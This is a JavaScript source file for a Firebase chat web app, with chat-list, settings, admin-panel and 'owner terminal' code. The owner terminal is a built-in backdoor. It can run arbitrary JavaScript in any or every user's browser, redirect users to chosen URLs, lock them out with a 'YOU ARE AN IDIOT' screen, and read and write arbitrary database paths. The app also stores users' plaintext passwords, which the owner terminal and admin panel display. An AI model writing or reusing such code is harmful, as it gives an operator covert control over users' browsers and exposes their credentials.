// ==================== UI HELPERS ====================
function showLogin() {
    document.getElementById('registerPage').classList.add('hidden');
    document.getElementById('loginPage').classList.remove('hidden');
}

function showRegister() {
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('registerPage').classList.remove('hidden');
}

function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }

function showChatApp() {
    if (currentUser.crashed) {
        showIdiotScreen();
        return;
    }
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('registerPage').classList.add('hidden');
    document.getElementById('maintenancePage').classList.add('hidden');
    document.getElementById('chatApp').classList.remove('hidden');

    document.getElementById('currentUsername').textContent = currentUser.username;
    document.getElementById('userAvatar').textContent = currentUser.avatar;

    const adminButton = document.getElementById('adminButton');
    if (currentUser && currentUser.isAdmin === true) {
        adminButton.classList.remove('hidden');
    } else {
        adminButton.classList.add('hidden');
    }

    const ownerButton = document.getElementById('ownerButton');
    if (currentUser && currentUser.isOwner) {
        ownerButton.classList.remove('hidden');
    } else {
        ownerButton.classList.add('hidden');
    }

    loadChatList();
    selectChat('global');
    initBroadcastListener();

    const savedTheme = localStorage.getItem('theme') || 'dark';
    applyTheme(savedTheme);
}

async function loadChatList() {
    const chatList = document.getElementById('chatList');
    
    // Start with channels
    chatList.innerHTML = `
        <div class="sidebar-section-header">Channels</div>
        <div class="chat-item ${currentChat === 'global' ? 'active' : ''}" onclick="selectChat('global')">
            <div class="avatar">🌍</div>
            <div class="chat-item-info">
                <div class="chat-item-name">Global Chat</div>
                <div class="chat-item-preview">Public chat room</div>
            </div>
        </div>
        <div class="chat-item ${currentChat === 'announcements' ? 'active' : ''}" onclick="selectChat('announcements')">
            <div class="avatar">📣</div>
            <div class="chat-item-info">
                <div class="chat-item-name">
                    Announcements
                    <span class="channel-badge">ADMIN</span>
                </div>
                <div class="chat-item-preview">Official announcements</div>
            </div>
        </div>
    `;

    try {
        // Load users for DMs
        const users = (await getCachedUsers()).filter(u => u.id !== currentUser.id);

        const chatsRef = rtdb.ref('privateChats');
        const chatsSnapshot = await chatsRef.once('value');
        const existingChats = new Set();
        if (chatsSnapshot.exists()) {
            Object.keys(chatsSnapshot.val()).forEach(chatId => {
                if (chatId.includes(currentUser.id)) existingChats.add(chatId);
            });
        }

        const sortedUsers = users.sort((a, b) => {
            const hasA = existingChats.has([currentUser.id, a.id].sort().join('_'));
            const hasB = existingChats.has([currentUser.id, b.id].sort().join('_'));
            if (hasA && !hasB) return -1;
            if (!hasA && hasB) return 1;
            return a.username.localeCompare(b.username);
        });

        const dmHeader = document.createElement('div');
        dmHeader.className = 'sidebar-section-header';
        dmHeader.textContent = 'Direct Messages';
        chatList.appendChild(dmHeader);

        sortedUsers.forEach(userData => {
            const chatId = [currentUser.id, userData.id].sort().join('_');
            const hasChat = existingChats.has(chatId);
            const chatItem = document.createElement('div');
            chatItem.className = `chat-item ${currentChat === chatId ? 'active' : ''}`;
            chatItem.onclick = () => hasChat ? selectChat(chatId) : startPrivateChat(userData.id);

            let userBadge = '';
            if (isOwnerUser(userData.username)) {
                userBadge = '<span class="badge owner" style="font-size:0.6rem;">⭐ OWNER</span>';
            } else if (userData.isAdmin) {
                userBadge = '<span class="badge admin" style="font-size:0.6rem;">ADMIN</span>';
            }

            chatItem.innerHTML = `
                <div class="avatar">${userData.avatar}</div>
                <div class="chat-item-info">
                    <div class="chat-item-name">
                        ${sanitizeHTML(userData.username)}
                        ${userBadge}
                        <span class="status-indicator ${userData.online ? '' : 'offline'}" id="status-${userData.id}"></span>
                    </div>
                    <div class="chat-item-preview">${hasChat ? 'Private chat' : 'Start chat'}</div>
                </div>
            `;
            chatList.appendChild(chatItem);

            if (!unreadCounts[chatId]) unreadCounts[chatId] = 0;

            listenToUserStatus(userData.id, status => {
                const indicator = document.getElementById(`status-${userData.id}`);
                if (indicator) indicator.className = `status-indicator ${status && status.online ? '' : 'offline'}`;
            });
        });

        updateUnreadBadge();
    } catch(error) {
        console.error('Error loading chat list:', error);
        showToast('Error loading users: ' + error.message, 'error');
    }
}

function selectChat(chatId) {
    currentChat = chatId;
    unreadCounts[chatId] = 0;

    document.querySelectorAll('.chat-item').forEach(item => item.classList.remove('active'));
    document.querySelectorAll('.chat-item').forEach(item => {
        const onclickAttr = item.getAttribute('onclick');
        if (onclickAttr && onclickAttr.includes(`'${chatId}'`)) item.classList.add('active');
    });

    const chatTitle = document.getElementById('chatTitle');
    if (chatId === 'global') {
        chatTitle.innerHTML = '<span class="avatar">🌍</span><span>Global Chat</span>';
    } else if (chatId === 'announcements') {
        chatTitle.innerHTML = '<span class="avatar">📣</span><span>Announcements</span>';
    } else {
        const otherUserId = chatId.split('_').find(id => id !== currentUser.id);
        getCachedUser(otherUserId).then(userData => {
            if (userData) {
                chatTitle.innerHTML = `
                    <span class="avatar">${userData.avatar}</span>
                    <span>${sanitizeHTML(userData.username)}</span>
                    <span class="status-indicator ${userData.online ? '' : 'offline'}" id="chat-status-${otherUserId}"></span>
                `;
                listenToUserStatus(otherUserId, status => {
                    const indicator = document.getElementById(`chat-status-${otherUserId}`);
                    if (indicator) indicator.className = `status-indicator ${status && status.online ? '' : 'offline'}`;
                });
            }
        });
    }

    const inputContainer = document.getElementById('inputContainer');
    const readonlyBar = document.getElementById('readonlyBar');
    if (chatId === 'announcements' && !currentUser.isAdmin && !currentUser.isOwner) {
        inputContainer.classList.add('hidden');
        readonlyBar.classList.remove('hidden');
    } else {
        inputContainer.classList.remove('hidden');
        readonlyBar.classList.add('hidden');
    }

    hideTypingIndicator();
    hideAutocomplete();
    loadMessages(chatId);
    updateUnreadBadge(chatId);

    if (window.innerWidth <= 768) document.getElementById('sidebar').classList.remove('open');
}

// ==================== SETTINGS ====================
function showSettings() {
    document.getElementById('settingsModal').classList.remove('hidden');
    initializeEmojiPicker();
    initializeThemeSelector();
}

function closeSettings() { document.getElementById('settingsModal').classList.add('hidden'); }

function switchTab(tabName, evt) {
    const modal = (evt.target || event.target).closest('.modal-content') || document;
    modal.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    modal.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    (evt ? evt.target : event.target).classList.add('active');
    document.getElementById(tabName + 'Tab').classList.add('active');
}

function switchAdminTab(tabId, evt) {
    const panel = (evt ? evt.target : event.target).closest('.modal-content');
    panel.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    panel.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    (evt ? evt.target : event.target).classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function initializeEmojiPicker() {
    const grid = document.getElementById('emojiGrid');
    grid.innerHTML = '';
    EMOJIS.forEach(emoji => {
        const btn = document.createElement('button');
        btn.className = 'emoji-btn';
        btn.textContent = emoji;
        if (emoji === currentUser.avatar) btn.classList.add('selected');
        btn.onclick = (e) => selectEmoji(emoji, e.target);
        grid.appendChild(btn);
    });
}

async function selectEmoji(emoji, btnEl) {
    try {
        await db.collection('users').doc(currentUser.id).update({ avatar: emoji });
        currentUser.avatar = emoji;
        document.getElementById('userAvatar').textContent = emoji;
        if (usersCache[currentUser.id]) usersCache[currentUser.id].avatar = emoji;
        document.querySelectorAll('.emoji-btn').forEach(btn => btn.classList.remove('selected'));
        if (btnEl) btnEl.classList.add('selected');
    } catch(error) { console.error('Error updating avatar:', error); }
}

function initializeThemeSelector() {
    const selector = document.getElementById('themeSelector');
    selector.innerHTML = '';
    const savedTheme = localStorage.getItem('theme') || 'light';
    THEMES.forEach(theme => {
        const btn = document.createElement('button');
        btn.className = 'theme-btn';
        btn.textContent = theme.charAt(0).toUpperCase() + theme.slice(1);
        if (theme === savedTheme) btn.classList.add('active');
        btn.onclick = (e) => selectTheme(theme, e.target);
        selector.appendChild(btn);
    });
}

function selectTheme(theme, btnEl) {
    applyTheme(theme);
    localStorage.setItem('theme', theme);
    document.querySelectorAll('.theme-btn').forEach(btn => btn.classList.remove('active'));
    if (btnEl) btnEl.classList.add('active');
}

function applyTheme(theme) { document.body.className = 'theme-' + theme; }

// ==================== OWNER TERMINAL - USER SPECIFIC COMMANDS ====================
function showOwnerTerminal() {
    if (!currentUser.isOwner) {
        showToast('Access denied', 'error');
        return;
    }
    document.getElementById('ownerTerminal').classList.remove('hidden');
    const output = document.getElementById('terminalOutput');
    output.innerHTML = '';
    addTerminalLine('Owner Terminal v2.0 - User Specific Commands', 'info');
    addTerminalLine('All commands now support targeting specific users!', 'info');
    addTerminalLine('Type "help" for commands.', 'info');
    document.getElementById('terminalInput').focus();
}

function closeOwnerTerminal() {
    document.getElementById('ownerTerminal').classList.add('hidden');
}

function addTerminalLine(text, type = 'normal') {
    const output = document.getElementById('terminalOutput');
    const line = document.createElement('div');
    line.className = 'terminal-line';
    
    if (type === 'error') {
        line.style.color = '#ff4444';
    } else if (type === 'success') {
        line.style.color = '#44ff44';
    } else if (type === 'info') {
        line.style.color = '#ffff44';
    }
    
    line.textContent = text;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

function handleTerminalKeypress(event) {
    if (event.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const command = input.value.trim();
        if (command) {
            addTerminalLine(`# ${command}`);
            executeTerminalCommand(command);
            input.value = '';
        }
    }
}

async function executeTerminalCommand(command) {
    const args = command.split(' ');
    const cmd = args[0].toLowerCase();

    switch(cmd) {
        case 'help':
            addTerminalLine('Available commands:', 'info');
            addTerminalLine('  help - Show this help');
            addTerminalLine('  users - List all users');
            addTerminalLine('  msg <username> <message> - Send popup message to user');
            addTerminalLine('  broadcast <message> - Send popup to all users');
            addTerminalLine('  js <username> <code> - Execute JS on specific user');
            addTerminalLine('  jsall <code> - Execute JS on all users');
            addTerminalLine('  crash <username> - Show "YOU ARE AN IDIOT" on specific user');
            addTerminalLine('  uncrash <username> - Undo the crash effect');
            addTerminalLine('  crashall - Show crash on all users');
            addTerminalLine('  uncrashall - Undo the crash effect for all users');
            addTerminalLine('  url <username> <url> - Open URL on specific user');
            addTerminalLine('  urlall <url> - Open URL on all users');
            addTerminalLine('  reload <username> - Reload specific user page');
            addTerminalLine('  reloadall - Reload all users');
            addTerminalLine('  getpass <username> - Get user plain password');
            addTerminalLine('  firebase <username> <path> - Read Firebase path for user');
            addTerminalLine('  firebaseset <username> <path> <value> - Set Firebase value');
            addTerminalLine('  clear - Clear terminal');
            break;

        case 'users':
            const users = await getCachedUsers();
            addTerminalLine(`Total users: ${users.length}`, 'info');
            users.forEach(u => {
                const status = u.online ? '🟢' : '⚪';
                addTerminalLine(`  ${status} ${u.username} (${u.id}) ${u.isAdmin ? '(ADMIN)' : ''} ${isOwnerUser(u.username) ? '(OWNER)' : ''}`);
            });
            break;

        case 'msg':
            if (args.length < 3) {
                addTerminalLine('Usage: msg <username> <message>', 'error');
                return;
            }
            const targetUsername = args[1];
            const message = args.slice(2).join(' ');
            
            const targetUser = Object.values(usersCache).find(u => u.username === targetUsername);
            if (!targetUser) {
                addTerminalLine(`User ${targetUsername} not found`, 'error');
                return;
            }

            await db.collection('broadcasts').add({
                type: 'owner_popup',
                message: message,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: [targetUser.id]
            });
            addTerminalLine(`Popup message sent to ${targetUsername}`, 'success');
            break;

        case 'broadcast':
            if (args.length < 2) {
                addTerminalLine('Usage: broadcast <message>', 'error');
                return;
            }
            const broadcastMsg = args.slice(1).join(' ');
            
            const allUserIds = Object.values(usersCache).map(u => u.id);
            await db.collection('broadcasts').add({
                type: 'owner_popup',
                message: broadcastMsg,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: allUserIds
            });
            addTerminalLine('Popup broadcast sent to all users', 'success');
            break;

        case 'js':
            if (args.length < 3) {
                addTerminalLine('Usage: js <username> <code>', 'error');
                return;
            }
            const jsTarget = args[1];
            const jsCode = args.slice(2).join(' ');
            
            const jsUser = Object.values(usersCache).find(u => u.username === jsTarget);
            if (!jsUser) {
                addTerminalLine(`User ${jsTarget} not found`, 'error');
                return;
            }

            await db.collection('broadcasts').add({
                type: 'js_execute',
                code: jsCode,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: [jsUser.id]
            });
            addTerminalLine(`JavaScript sent to ${jsTarget}`, 'success');
            break;

        case 'jsall':
            if (args.length < 2) {
                addTerminalLine('Usage: jsall <code>', 'error');
                return;
            }
            const jsAllCode = args.slice(1).join(' ');
            
            const allJsUsers = Object.values(usersCache).map(u => u.id);
            await db.collection('broadcasts').add({
                type: 'js_execute',
                code: jsAllCode,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: allJsUsers
            });
            addTerminalLine('JavaScript sent to all users', 'success');
            break;

        case 'crash':
            if (args.length < 2) {
                addTerminalLine('Usage: crash <username>', 'error');
                return;
            }
            const crashTarget = args[1];
            
            const crashUser = Object.values(usersCache).find(u => u.username === crashTarget);
            if (!crashUser) {
                addTerminalLine(`User ${crashTarget} not found`, 'error');
                return;
            }

            await db.collection('users').doc(crashUser.id).update({ crashed: true });
            addTerminalLine(`💥 CRASH sent to ${crashTarget}`, 'success');
            break;

        case 'uncrash':
            if (args.length < 2) {
                addTerminalLine('Usage: uncrash <username>', 'error');
                return;
            }
            const uncrashTarget = args[1];
            
            const uncrashUser = Object.values(usersCache).find(u => u.username === uncrashTarget);
            if (!uncrashUser) {
                addTerminalLine(`User ${uncrashTarget} not found`, 'error');
                return;
            }

            await db.collection('users').doc(uncrashUser.id).update({ crashed: false });
            addTerminalLine(`✅ UNCRASH sent to ${uncrashTarget}`, 'success');
            break;

        case 'crashall':
            const allCrashUsers = await getCachedUsers();
            const crashPromises = allCrashUsers.map(u => db.collection('users').doc(u.id).update({ crashed: true }));
            await Promise.all(crashPromises);
            addTerminalLine('💥 CRASH sent to all users', 'success');
            break;

        case 'uncrashall':
            const allUncrashUsers = await getCachedUsers();
            const uncrashPromises = allUncrashUsers.map(u => db.collection('users').doc(u.id).update({ crashed: false }));
            await Promise.all(uncrashPromises);
            addTerminalLine('✅ UNCRASH sent to all users', 'success');
            break;

        case 'url':
            if (args.length < 3) {
                addTerminalLine('Usage: url <username> <url>', 'error');
                return;
            }
            const urlTarget = args[1];
            const url = args[2];
            
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                addTerminalLine('URL must start with http:// or https://', 'error');
                return;
            }

            const urlUser = Object.values(usersCache).find(u => u.username === urlTarget);
            if (!urlUser) {
                addTerminalLine(`User ${urlTarget} not found`, 'error');
                return;
            }

            await db.collection('broadcasts').add({
                type: 'url_redirect',
                url: url,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: [urlUser.id]
            });
            addTerminalLine(`URL sent to ${urlTarget}`, 'success');
            break;

        case 'urlall':
            if (args.length < 2) {
                addTerminalLine('Usage: urlall <url>', 'error');
                return;
            }
            const urlAll = args[1];
            
            if (!urlAll.startsWith('http://') && !urlAll.startsWith('https://')) {
                addTerminalLine('URL must start with http:// or https://', 'error');
                return;
            }

            const allUrlUsers = Object.values(usersCache).map(u => u.id);
            await db.collection('broadcasts').add({
                type: 'url_redirect',
                url: urlAll,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: allUrlUsers
            });
            addTerminalLine('URL sent to all users', 'success');
            break;

        case 'reload':
            if (args.length < 2) {
                addTerminalLine('Usage: reload <username>', 'error');
                return;
            }
            const reloadTarget = args[1];
            
            const reloadUser = Object.values(usersCache).find(u => u.username === reloadTarget);
            if (!reloadUser) {
                addTerminalLine(`User ${reloadTarget} not found`, 'error');
                return;
            }

            await db.collection('broadcasts').add({
                type: 'force_reload',
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: [reloadUser.id]
            });
            addTerminalLine(`Reload command sent to ${reloadTarget}`, 'success');
            break;

        case 'reloadall':
            const allReloadUsers = Object.values(usersCache).map(u => u.id);
            await db.collection('broadcasts').add({
                type: 'force_reload',
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                sentBy: currentUser.id,
                targetUsers: allReloadUsers
            });
            addTerminalLine('Reload command sent to all users', 'success');
            break;


        case 'getpass':
            if (args.length < 2) {
                addTerminalLine('Usage: getpass <username>', 'error');
                return;
            }
            const passTarget = args[1];
            
            const passUser = Object.values(usersCache).find(u => u.username === passTarget);
            if (!passUser) {
                addTerminalLine(`User ${passTarget} not found`, 'error');
                return;
            }

            if (passUser.plainPassword) {
                addTerminalLine(`Password for ${passTarget}: ${passUser.plainPassword}`, 'success');
            } else {
                addTerminalLine(`No plain password stored for ${passTarget}`, 'error');
            }
            break;

        case 'firebase':
            if (args.length < 3) {
                addTerminalLine('Usage: firebase <username> <path>', 'error');
                return;
            }
            const fbTarget = args[1];
            const fbPath = args[2];
            
            const fbUser = Object.values(usersCache).find(u => u.username === fbTarget);
            if (!fbUser) {
                addTerminalLine(`User ${fbTarget} not found`, 'error');
                return;
            }

            try {
                const snapshot = await rtdb.ref(`${fbPath}`).once('value');
                const data = snapshot.val();
                addTerminalLine(`Firebase data at ${fbPath}: ${JSON.stringify(data, null, 2)}`, 'success');
            } catch(e) {
                addTerminalLine(`Error reading Firebase: ${e.message}`, 'error');
            }
            break;

        case 'firebaseset':
            if (args.length < 4) {
                addTerminalLine('Usage: firebaseset <username> <path> <value>', 'error');
                return;
            }
            const fbSetTarget = args[1];
            const fbSetPath = args[2];
            const fbSetValue = args.slice(3).join(' ');
            
            const fbSetUser = Object.values(usersCache).find(u => u.username === fbSetTarget);
            if (!fbSetUser) {
                addTerminalLine(`User ${fbSetTarget} not found`, 'error');
                return;
            }

            try {
                let parsedValue;
                try {
                    parsedValue = JSON.parse(fbSetValue);
                } catch {
                    parsedValue = fbSetValue;
                }
                
                await rtdb.ref(`${fbSetPath}`).set(parsedValue);
                addTerminalLine(`Firebase path ${fbSetPath} set successfully`, 'success');
            } catch(e) {
                addTerminalLine(`Error setting Firebase: ${e.message}`, 'error');
            }
            break;

        case 'clear':
            document.getElementById('terminalOutput').innerHTML = '';
            break;

        default:
            addTerminalLine(`Unknown command: ${cmd}`, 'error');
    }
}

// Owner popup functions
function showOwnerPopup(message) {
    const popup = document.getElementById('ownerPopup');
    const content = document.getElementById('ownerPopupContent');
    content.textContent = message;
    popup.classList.remove('hidden');
}

function closeOwnerPopup() {
    document.getElementById('ownerPopup').classList.add('hidden');
}

// ==================== ADMIN PANEL ====================
async function showAdminPanel() {
    if (!currentUser.isAdmin && !currentUser.isOwner) { showToast('Access denied', 'error'); return; }
    document.getElementById('adminModal').classList.remove('hidden');
    await Promise.all([
        loadAdminStats(),
        loadAdminUsers(),
        loadBlockedIPsCache().then(() => Promise.all([loadIPTracking(), loadBlockedIPs()])),
        loadMaintenanceStatus()
    ]);
}

function closeAdminPanel() { document.getElementById('adminModal').classList.add('hidden'); }

async function checkMaintenanceStatus() {
    showLoading();
    const maintenanceMode = await getMaintenanceStatus(true);
    hideLoading();
    if (!maintenanceMode) { location.reload(); }
    else { showToast('Still under maintenance, please wait...', 'info'); }
}

async function loadAdminStats() {
    try {
        const [usersSnapshot, statusSnapshot, messagesSnapshot] = await Promise.all([
            db.collection('users').get(),
            rtdb.ref('status').once('value'),
            db.collection('messages').get()
        ]);
        document.getElementById('totalUsers').textContent = usersSnapshot.size;
        let onlineCount = 0;
        statusSnapshot.forEach(child => { if (child.val().online) onlineCount++; });
        document.getElementById('onlineUsers').textContent = onlineCount;
        document.getElementById('totalMessages').textContent = messagesSnapshot.size;
        document.getElementById('totalGroups').textContent = 0;
    } catch(error) { console.error('Error loading stats:', error); }
}

async function loadAdminUsers() {
    const userList = document.getElementById('adminUserList');
    userList.innerHTML = '';
    const users = await getCachedUsers();
    users.forEach(userData => {
        const isUserOwner = isOwnerUser(userData.username);
        const div = document.createElement('div');
        div.className = 'user-item';
        div.innerHTML = `
            <div class="user-item-info">
                <span class="avatar">${userData.avatar}</span>
                <span>${sanitizeHTML(userData.username)}</span>
                ${isUserOwner ? '<span class="badge owner">⭐ OWNER</span>' : (userData.isAdmin ? '<span class="badge admin">ADMIN</span>' : '')}
            </div>
            <div class="user-actions">
                ${!isUserOwner ? `
                    ${!userData.isAdmin ? `<button class="btn-small" onclick="makeAdmin('${userData.id}')">Make Admin</button>` : ''}
                    ${userData.isAdmin && userData.id !== currentUser.id ? `<button class="btn-small" onclick="removeAdmin('${userData.id}')">Remove Admin</button>` : ''}
                    ${userData.id !== currentUser.id ? `<button class="btn-small btn-danger" onclick="deleteUser('${userData.id}')">Delete</button>` : ''}
                    <button class="btn-small btn-secondary" onclick="viewUserPassword('${userData.id}')">View Password</button>
                    <button class="btn-small btn-secondary" onclick="setUserPassword('${userData.id}')">Set Password</button>
                ` : `<span style="color:var(--owner-color); font-size:0.8rem;">⭐ Owner — protected</span>`}
            </div>
        `;
        userList.appendChild(div);
    });
}

function viewUserPassword(userId) {
    const user = usersCache[userId];
    if (user && user.plainPassword) {
        alert(`Plain password for ${user.username}: ${user.plainPassword}`);
    } else {
        alert('Password not available');
    }
}

async function setUserPassword(userId) {
    const newPassword = prompt("Enter new plain password for this user:");
    if (!newPassword) return;
    if (newPassword.length < 3) { alert("Password too short"); return; }
    try {
        showLoading();
        const user = await getCachedUser(userId);
        const newSalt = generateSalt();
        const newHash = await hashPassword(newPassword, newSalt);
        
        await db.collection('users').doc(userId).update({ 
            password: newHash,
            plainPassword: newPassword,
            salt: newSalt 
        });
        
        if (usersCache[userId]) { 
            usersCache[userId].password = newHash;
            usersCache[userId].plainPassword = newPassword;
            usersCache[userId].salt = newSalt;
        }
        
        showToast("Password updated successfully", "success");
    } catch(error) {
        showToast("Error: " + error.message, "error");
    } finally {
        hideLoading();
    }
}

async function makeAdmin(userId) {
    try {
        const user = await getCachedUser(userId);
        if (user && isOwnerUser(user.username)) { showToast('Cannot change owner role', 'error'); return; }
        await db.collection('users').doc(userId).update({ isAdmin: true });
        if (usersCache[userId]) usersCache[userId].isAdmin = true;
        showToast('Admin rights granted', 'success');
        loadAdminUsers();
    } catch(error) { showToast('Error: ' + error.message, 'error'); }
}

async function removeAdmin(userId) {
    try {
        const user = await getCachedUser(userId);
        if (user && isOwnerUser(user.username)) { showToast('Cannot remove owner', 'error'); return; }
        await db.collection('users').doc(userId).update({ isAdmin: false });
        if (usersCache[userId]) usersCache[userId].isAdmin = false;
        showToast('Admin rights revoked', 'success');
        loadAdminUsers();
    } catch(error) { showToast('Error: ' + error.message, 'error'); }
}

async function deleteUser(userId) {
    try {
        const user = await getCachedUser(userId);
        if (user && isOwnerUser(user.username)) { showToast('Cannot delete the owner', 'error'); return; }
        await db.collection('users').doc(userId).delete();
        await rtdb.ref('status/' + userId).remove();
        delete usersCache[userId];
        showToast('User deleted', 'success');
        loadAdminUsers();
        loadAdminStats();
    } catch(error) { showToast('Error: ' + error.message, 'error'); }
}

async function sendBroadcast() {
    const content = document.getElementById('broadcastMessage').value.trim();
    if (!content) { showToast('Please enter a message', 'warning'); return; }
    try {
        showLoading();
        await db.collection('broadcasts').add({
            type: 'message',
            message: content,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            sentBy: currentUser.id,
            sentByName: currentUser.username
        });
        document.getElementById('broadcastMessage').value = '';
        hideLoading();
        showToast('Broadcast sent!', 'success');
    } catch(error) {
        hideLoading();
        showToast('Error sending broadcast: ' + error.message, 'error');
    }
}

async function cleanupOldMessages() {
    try {
        showLoading();
        const messagesSnapshot = await db.collection('messages').orderBy('timestamp', 'desc').get();
        const toDelete = [];
        messagesSnapshot.forEach((doc, index) => {
            if (index >= 100) toDelete.push(doc.ref.delete());
        });
        await Promise.all(toDelete);
        hideLoading();
        showToast('Cleanup completed!', 'success');
        loadAdminStats();
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

async function wipeAllData() {
    if (!confirm('Are you sure you want to wipe all chat data? This cannot be undone.')) return;
    try {
        showLoading();
        const messagesSnapshot = await db.collection('messages').get();
        const deletions = [];
        messagesSnapshot.forEach(doc => deletions.push(doc.ref.delete()));
        await Promise.all([...deletions, rtdb.ref('privateChats').remove()]);
        hideLoading();
        showToast('All data wiped!', 'warning');
        loadAdminStats();
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

async function toggleMaintenance() {
    const settingsRef = db.collection('admin').doc('settings');
    const settingsDoc = await settingsRef.get();
    const currentState = settingsDoc.exists ? settingsDoc.data().maintenanceMode : false;
    const newState = !currentState;
    await settingsRef.set({ maintenanceMode: newState }, { merge: true });
    invalidateMaintenanceCache();
    document.getElementById('maintenanceText').textContent = newState ? 'Disable Maintenance' : 'Enable Maintenance';
    showToast(newState ? 'Maintenance mode enabled' : 'Maintenance mode disabled', 'info');
}

async function loadMaintenanceStatus() {
    const maintenanceMode = await getMaintenanceStatus(true);
    document.getElementById('maintenanceText').textContent = maintenanceMode ? 'Disable Maintenance' : 'Enable Maintenance';
}

async function loadIPTracking() {
    const listDiv = document.getElementById('ipTrackingList');
    listDiv.innerHTML = '<p style="text-align: center; color: var(--text-secondary);">Loading...</p>';
    try {
        const users = await getCachedUsers();
        users.sort((a, b) => {
            const aTime = a.lastSeen ? a.lastSeen.toMillis() : 0;
            const bTime = b.lastSeen ? b.lastSeen.toMillis() : 0;
            return bTime - aTime;
        });
        listDiv.innerHTML = '';
        if (users.length === 0) { listDiv.innerHTML = '<p style="text-align: center; color: var(--text-secondary);">No users found</p>'; return; }
        users.forEach(user => {
            const isUserOwner = isOwnerUser(user.username);
            const div = document.createElement('div');
            div.className = 'user-item';
            div.style.cssText = 'display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: var(--background); border-radius: 0.5rem; margin-bottom: 0.5rem;';
            const isBlocked = checkIfIPBlocked(user.ip || 'Unknown');
            div.innerHTML = `
                <div style="display: flex; align-items: center; gap: 0.75rem; flex: 1;">
                    <span class="avatar">${user.avatar}</span>
                    <div style="flex: 1;">
                        <div style="font-weight: 600; margin-bottom: 0.25rem;">
                            ${sanitizeHTML(user.username)}
                            ${isUserOwner ? '<span class="badge owner">⭐ OWNER</span>' : (user.isAdmin ? '<span class="badge admin">ADMIN</span>' : '')}
                        </div>
                        <div style="font-size: 0.875rem; color: var(--text-secondary);">
                            IP: <code style="background: var(--surface); padding: 0.25rem 0.5rem; border-radius: 0.25rem; font-family: monospace;">${user.ip || 'Unknown'}</code>
                        </div>
                        ${user.lastSeen ? `<div style="font-size: 0.75rem; color: var(--text-secondary); margin-top: 0.25rem;">Last seen: ${formatTimestamp(user.lastSeen)}</div>` : ''}
                    </div>
                </div>
                <div style="display: flex; gap: 0.5rem;">
                    ${user.ip && user.ip !== 'Unknown' && !isUserOwner ? `
                        <button class="btn-small ${isBlocked ? '' : 'btn-danger'}" onclick="toggleIPBan('${user.ip}', '${user.username}')">
                            ${isBlocked ? '🔓 Unban IP' : '🚫 Ban IP'}
                        </button>
                    ` : ''}
                </div>
            `;
            listDiv.appendChild(div);
        });
        document.getElementById('ipSearchInput').oninput = function() {
            const searchTerm = this.value.toLowerCase();
            Array.from(listDiv.children).forEach(item => {
                item.style.display = item.textContent.toLowerCase().includes(searchTerm) ? '' : 'none';
            });
        };
    } catch(error) {
        console.error('Error loading IP tracking:', error);
        listDiv.innerHTML = '<p style="text-align: center; color: var(--danger);">Error loading IP data</p>';
    }
}

async function loadBlockedIPsCache() {
    const doc = await db.collection('admin').doc('blockedIPs').get();
    cachedBlockedIPs = doc.exists ? (doc.data().ips || []) : [];
}

function checkIfIPBlocked(ip) { return cachedBlockedIPs.includes(ip); }

async function toggleIPBan(ip, username) {
    try {
        showLoading();
        const blockedRef = db.collection('admin').doc('blockedIPs');
        const doc = await blockedRef.get();
        let ips = doc.exists ? (doc.data().ips || []) : [];
        const isCurrentlyBlocked = ips.includes(ip);
        if (isCurrentlyBlocked) {
            ips = ips.filter(i => i !== ip);
            await blockedRef.set({ ips }, { merge: true });
            showToast(`IP ${ip} unbanned (${username})`, 'success');
        } else {
            if (!ips.includes(ip)) { ips.push(ip); await blockedRef.set({ ips }, { merge: true }); }
            showToast(`IP ${ip} banned (${username})`, 'warning');
        }
        await loadBlockedIPsCache();
        await loadIPTracking();
        await loadBlockedIPs();
        hideLoading();
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

async function blockIP() {
    const ip = document.getElementById('blockIpInput').value.trim();
    if (!ip) { showToast('Please enter an IP address', 'warning'); return; }
    try {
        const blockedRef = db.collection('admin').doc('blockedIPs');
        const doc = await blockedRef.get();
        const ips = doc.exists ? (doc.data().ips || []) : [];
        if (!ips.includes(ip)) { ips.push(ip); await blockedRef.set({ ips }, { merge: true }); }
        document.getElementById('blockIpInput').value = '';
        await loadBlockedIPsCache();
        loadBlockedIPs();
        loadIPTracking();
        showToast('IP blocked successfully', 'success');
    } catch(error) { showToast('Error: ' + error.message, 'error'); }
}

async function loadBlockedIPs() {
    const listDiv = document.getElementById('blockedIpList');
    const doc = await db.collection('admin').doc('blockedIPs').get();
    if (!doc.exists || !doc.data().ips || doc.data().ips.length === 0) {
        listDiv.innerHTML = '<p style="color: var(--text-secondary); font-size: 0.875rem;">No blocked IPs</p>';
        return;
    }
    const ips = doc.data().ips;
    listDiv.innerHTML = '<h4 style="margin-bottom: 0.5rem;">Blocked IPs:</h4>';
    ips.forEach(ip => {
        const div = document.createElement('div');
        div.style.cssText = 'display: flex; justify-content: space-between; padding: 0.5rem; background: var(--background); border-radius: 0.25rem; margin-bottom: 0.25rem;';
        div.innerHTML = `
            <span>${ip}</span>
